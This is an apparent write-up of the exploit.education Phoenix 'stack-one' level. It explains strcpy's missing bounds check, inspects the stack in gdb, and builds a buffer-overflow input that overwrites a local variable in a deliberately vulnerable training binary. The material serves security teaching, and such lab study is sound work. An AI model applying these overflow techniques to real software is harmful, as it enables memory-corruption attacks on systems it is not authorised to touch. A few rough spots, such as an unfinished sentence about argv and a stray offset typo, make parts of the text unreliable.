# stack-one

_The source code for this level can be found here: [stack-one source code](stack-one.c) (https://exploit.education/phoenix/stack-one/)_

This time, our goal is to change the variable `locals.changeme` to hex value `0x496c5962`. 

Let us have a look at the man page for the function strcopy. The description section reads: 


> "_The strcpy() function copies the string pointed to by src, including the terminating null byte ('\0'), to the buffer pointed to by dest.  The strings may not overlap, and the destination string dest must be large enough to receive the copy. Beware of buffer overruns!_"

Here, the pointer `dest` refers to the first parameter and the pointer `src` refers to the second one. So strcopy copies a string from one place in memory to another. The description warns us of buffer overruns. In the bugs section we find: 

> _If the destination string of a strcpy() is not large enough, then anything might happen.  Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.  Any time a program reads or copies data into a buffer, the program first needs to check that there's enough space.  This may be unnecessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible._ 

Like with gets, strcopy by itself does not check whether the destination buffer is large enough to hold the source string that we wish to copy. If it is not, the program will simply continue to write outside the buffer, overwriting the contents of addresses above it. Since we can freely control the source string via argv, we can easily write whatever we want outside the buffer. 

We expect the changeme variable to be positioned just above the buffer on the stack. Let us open stack-one in gdb and check that this is indeed the case.

```console
user@phoenix-amd64:/opt/phoenix/amd64$ gdb stack-one
gef➤  disassemble main
Dump of assembler code for function main:
...output omitted...
   0x000000000040069b <+46>:	call   0x4004d0 <errx@plt>
   0x00000000004006a0 <+51>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004006a7 <+58>:	mov    rax,QWORD PTR [rbp-0x60]
   0x00000000004006ab <+62>:	add    rax,0x8
   0x00000000004006af <+66>:	mov    rdx,QWORD PTR [rax]
   0x00000000004006b2 <+69>:	lea    rax,[rbp-0x50]
   0x00000000004006b6 <+73>:	mov    rsi,rdx
   0x00000000004006b9 <+76>:	mov    rdi,rax
   0x00000000004006bc <+79>:	call   0x4004a0 <strcpy@plt>
   0x00000000004006c1 <+84>:	mov    eax,DWORD PTR [rbp-0x10]
   0x00000000004006c4 <+87>:	cmp    eax,0x496c5962
   0x00000000004006c9 <+92>:	jne    0x4006d7 <main+106>
...output omitted...
   0x00000000004006f0 <+131>:	call   0x4004e0 <exit@plt>
End of assembler dump.
```

At <main+51> we see that the changeme variable is being set to 0. It starts at rbp-0x10. The next three instructions move a pointer to argv\[1\] (which is  into rdx, but argv\[1] should be the second argument

Let us set breakpoints before and after `strcopy` so that we can see what happens on the stack. To keep it simple, we also turn of gef context **(DOESN'T WORK???)**. After running the program with 64 bytes of all A's followed by B, C, D and E as input, we examine the stack before and after `strcopy`. 

```console
gef➤  break \*0x00000000004006bc
Breakpoint 1 at 0x4006bc
gef➤  break \*0x00000000004006c1
Breakpoint 2 at 0x4006c1
gef➤  gef config context.enable=False
gef➤  r $(python -c 'print("A"*64 + "BCDE")')
Starting program: /opt/phoenix/amd64/stack-one $(python -c 'print("A"*64 + "BCDE")')
Welcome to phoenix/stack-one, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004006bc in main ()
gef➤  x/68bx $rbp-0x50
0x7fffffffe480: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe488: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe490: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe498: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4a0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4a8: 0x28    0xe5    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe4b0: 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4b8: 0x40    0xe5    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe4c0: 0x00    0x00    0x00    0x00
gef➤  x $rbp-0x50
0x7fffffffe480: 0x00
gef➤  x $rbp-0x10
0x7fffffffe4c0: 0x00
```

The first 8 lines, or 64 bytes, is the `dest` buffer. Most of the bytes in the buffer are zero, but there are some random non-zero values there as well. The 4 last bytes is the `changeme` integer, which you can see is set to 0. Next, we continue the program until the breakpoint after strcopy and examine the stack again. As you can see below, the buffer is now completely filled with `0x41`, which is the hex value corresponding to the ASCII character `A`. The `changeme` variable now holds the value `0x45444342` which corresponds to the input `BCDE`. 

```console
gef➤  c
Continuing.

Breakpoint 2, 0x00000000004006c1 in main ()
gef➤  x/68bx $rbp-0x50
0x7fffffffe480: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe488: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe490: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe498: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4a0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4a8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4b0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4b8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4c0: 0x42    0x43    0x44    0x45
gef➤  c
Continuing.
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
[Inferior 1 (process 327) exited normally]
```

So, to beat this excercise, our input should be 64 bytes of random input followed by 0x496c5962. That hex number is stored as 4 consecutive bytes starting at `rbp-0x10` and ending at `rbp-0d`. Each character we give as input to the program will be translated to its ASCII value. We must therefore find what ASCII characters correspond to the hex values `0x49`, `0x6c`, `0x59`, `0x62`. They are `I`, `l`, `Y`, and `b`, respectively. (See `man ascii`.) Since x86-64 uses a little endian system, we must place the least significant byte (`0x62`) at the smallest/lowest address (`rbp-0x10)`. Therefore, the characters must be fed to the program in reverse order, i.e., `bYlI`.

```console
gef➤  r $(python -c 'print("A"*64 + "bYlI")')
gef➤  c
gef➤  x/68bx $rbp-0x50
...output omitted...
0x7fffffffe4b8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe4c0: 0x62    0x59    0x6c    0x49
gef➤  c
Continuing.
Well done, you have successfully set changeme to the correct value
```

There you have it. Finally, to complete the excercise, we simply run the following:

```console
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one $(python -c 'print("A"*64 + "bYlI")')
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

